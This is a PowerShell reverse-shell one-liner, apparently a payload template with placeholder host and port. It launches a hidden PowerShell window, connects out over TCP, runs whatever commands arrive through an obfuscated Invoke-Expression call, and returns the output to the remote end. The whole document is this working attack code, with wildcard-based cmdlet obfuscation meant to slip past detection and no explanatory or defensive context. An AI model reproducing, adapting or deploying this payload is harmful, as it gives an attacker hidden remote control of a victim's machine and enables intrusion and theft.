Start-Process $PSHOME\powershell.exe -ArgumentList {$var1 = New-Object Net.Sockets.TCPClient('{HOST}', {PORT});$var2 = $var1.GetStream();$var3 = New-Object IO.StreamWriter($var2);function WriteToStream ($var4) {[byte[]]$script:Buffer = 0..$var1.ReceiveBufferSize | % {0};$var3.Write($var4);$var3.Flush()}WriteToStream '';while(($var5 = $var2.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$var6 = ([text.encoding]::UTF8).GetString($Buffer, 0, $var5 - 1);$var7 = try { &(gcm I************************************************************************************************-E**********************************************************n) $var6 2>&1 | &(gcm O**********************************************t-S*******************************************************g)} catch {$_ | Out-String}WriteToStream ($var7)}$var3.Close()} -WindowStyle Hidden
